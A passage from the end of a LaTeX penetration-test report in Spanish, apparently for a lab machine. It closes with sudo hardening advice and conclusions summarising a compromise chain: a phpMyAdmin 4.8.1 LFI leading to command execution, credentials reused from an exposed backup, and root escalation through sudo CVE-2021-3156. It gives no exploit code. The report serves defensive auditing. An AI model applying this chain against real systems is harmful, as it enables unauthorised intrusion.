            \item No permitir que los usuarios ejecuten comandos arbitrarios como root.
        \end{itemize}
    \item Implementar monitoreo de uso de sudo mediante logs (\texttt{/var/log/auth.log}) y alertas de comportamiento anómalo.
    \item Considerar el uso de herramientas de auditoría como \texttt{sudo -l} para revisar regularmente los privilegios asignados a cada usuario.
\end{itemize}


                        \clearpage
                        \section{Conclusiones}

Durante la auditoría de seguridad realizada a la máquina \textbf{\nombreMaquina}, se identificaron múltiples vulnerabilidades críticas que permitieron comprometer de forma progresiva el sistema, desde el acceso inicial hasta la obtención de privilegios de superusuario.

La explotación de una versión vulnerable de \textbf{PhpMyAdmin 4.8.1}, accesible a través del subdominio \textbf{datasafe.votenow.local}, permitió la ejecución remota de comandos mediante una vulnerabilidad de tipo \textbf{LFI}, logrando así acceso al servidor con el usuario \textbf{apache}. Este acceso inicial fue facilitado además por la exposición de un archivo de backup que contenía credenciales reutilizadas de la base de datos.

Una vez obtenido acceso al sistema, se identificó que el binario \texttt{sudo} correspondía a la versión \textbf{1.8.23}, vulnerable a \textbf{CVE-2021-3156 (Baron Samedit)}. Esta vulnerabilidad permitió realizar una escalada de privilegios local sin necesidad de credenciales adicionales, derivando en la creación de un usuario con \textbf{UID 0} y, por tanto, en el control total del sistema como superusuario.

El impacto de estas vulnerabilidades combinadas es \textbf{crítico}, ya que un atacante podría:
\begin{itemize}
    \item Obtener acceso completo al sistema operativo.
    \item Comprometer la integridad y confidencialidad de la información almacenada.
    \item Modificar la configuración del sistema y establecer mecanismos de persistencia.
\end{itemize}

Se recomienda aplicar de manera inmediata las contramedidas propuestas, incluyendo la actualización de \textbf{PhpMyAdmin} y \textbf{sudo}, la eliminación de archivos sensibles expuestos, la revisión de configuraciones inseguras y la implementación de controles de monitorización y auditoría. La falta de aplicación de estas medidas supone un alto riesgo de compromiso total del servidor y de los datos alojados en él.





\end{document}
```